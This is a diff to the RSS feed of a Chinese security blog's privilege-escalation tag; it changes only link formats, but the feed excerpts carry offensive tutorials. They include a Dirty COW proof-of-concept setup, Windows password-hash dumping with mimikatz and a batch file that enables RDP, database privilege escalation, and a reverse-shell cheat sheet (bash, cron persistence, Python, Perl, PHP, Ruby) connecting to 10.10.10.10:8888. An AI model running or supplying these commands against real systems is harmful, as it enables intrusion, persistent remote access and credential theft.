@@ -2,7 +2,7 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Elevate Privileges on Reber&#39;s Blog</title>
-    <link>http://wyb0.com/tags/elevate-privileges.html</link>
+    <link>http://wyb0.com/tags/elevate-privileges/</link>
     <description>Recent content in Elevate Privileges on Reber&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
@@ -14,10 +14,10 @@
     
     <item>
       <title>脏牛漏洞</title>
-      <link>http://wyb0.com/posts/dirty-cow-vulnerabilities.html</link>
+      <link>http://wyb0.com/posts/dirty-cow-vulnerabilities/</link>
       <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/dirty-cow-vulnerabilities.html</guid>
+      <guid>http://wyb0.com/posts/dirty-cow-vulnerabilities/</guid>
       <description>0x00 测试环境  我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见
 CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux [reber123@WYB ~]$ id uid=502(reber123) gid=502(reber123) groups=502(reber123)   0x01 创建文件  查看文件权限信息，可以看到属主为root，且只读，权限为0404
 [reber123@WYB ~]$ ls -al test -r-----r-- 1 root root 19 Oct 21 00:02 test [reber123@WYB ~]$ cat test this is not a test [reber123@WYB ~]$   0x02 编译、执行poc  POC保存为a.c，编译为aaa</description>
@@ -25,20 +25,20 @@ CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 S
     
     <item>
       <title>Linux下系统漏洞提权</title>
-      <link>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges.html</link>
+      <link>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</link>
       <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges.html</guid>
+      <guid>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</guid>
       <description>0x00 Linux下的提权  Linux下一般都是系统漏洞提权，分为以下几个步骤：
 1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用   0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
     </item>
     
     <item>
       <title>导出主机密码与开启3389</title>
-      <link>http://wyb0.com/posts/export-host-password-and-open-3389.html</link>
+      <link>http://wyb0.com/posts/export-host-password-and-open-3389/</link>
       <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/export-host-password-and-open-3389.html</guid>
+      <guid>http://wyb0.com/posts/export-host-password-and-open-3389/</guid>
       <description>0x00 导出主机密码hash  条件  administrator以上权限  工具  wce gethash hashdump  hash解密网站
  http://www.objectif-securite.ch/ophcrack.php  上传工具得到hash   0x01 导出主机密码  条件  administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具  mimikatz getpass  上传工具得到密码   0x02 开启3389  直接使用注册表  写一个批处理也行
 # 3389.bat内容如下： echo Windows Registry Editor Version 5.00&amp;gt;&amp;gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&amp;gt;&amp;gt;3389.reg echo &amp;quot;fDenyTSConnections&amp;quot;=dword:00000000&amp;gt;&amp;gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&amp;gt;&amp;gt;3389.</description>
@@ -46,10 +46,10 @@ CentOS release 6.5 [reber123@WYB ~]$ uname -a Linux WYB 3.10.5-3.el6.x86_64 #1 S
     
     <item>
       <title>Windows下第三方服务提权</title>
-      <link>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges.html</link>
+      <link>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</link>
       <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges.html</guid>
+      <guid>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</guid>
       <description>MSSQL和MySQL提权
 MSSQL提权  MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
 提权条件：数据库账号是DBA权限
@@ -65,20 +65,20 @@ CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.</description>
     
     <item>
       <title>Windows下系统漏洞提权</title>
-      <link>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges.html</link>
+      <link>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</link>
       <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges.html</guid>
+      <guid>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</guid>
       <description> 提权是在已经getshell但是权限不大的前提下做的
 0x00 查看基本信息   0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁  上传exp提权   0x03 添加用户  添加远程连接用户   0x04 使用3389远程连接   </description>
     </item>
     
     <item>
       <title>Linux下反弹shell</title>
-      <link>http://wyb0.com/posts/linux-bounce-shell.html</link>
+      <link>http://wyb0.com/posts/linux-bounce-shell/</link>
       <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/linux-bounce-shell.html</guid>
+      <guid>http://wyb0.com/posts/linux-bounce-shell/</guid>
       <description>当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
 0x00 Bash /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1 注：这个由解析shell的bash完成，有些时候不支持  0x01 crontab 下面这条命令执行后会每隔30分钟反弹一次： (crontab -l;printf &amp;quot;*/30 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/10.10.10.10/8888;exec 0&amp;lt;&amp;amp;9; exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&amp;quot;)| crontab -  0x02 Python # 下面为1条命令 python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((&amp;quot;10.10.10.10&amp;quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;  0x03 Perl # 下面为1条命令 perl -e &#39;use Socket;$i=&amp;quot;10.10.10.10&amp;quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, &amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;  0x04 PHP php -r &#39;$sock=fsockopen(&amp;quot;10.10.10.10&amp;quot;,8888);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;  0x05 Ruby # 下面为1条命令 ruby -rsocket -e&#39;f=TCPSocket.</description>
     </item>
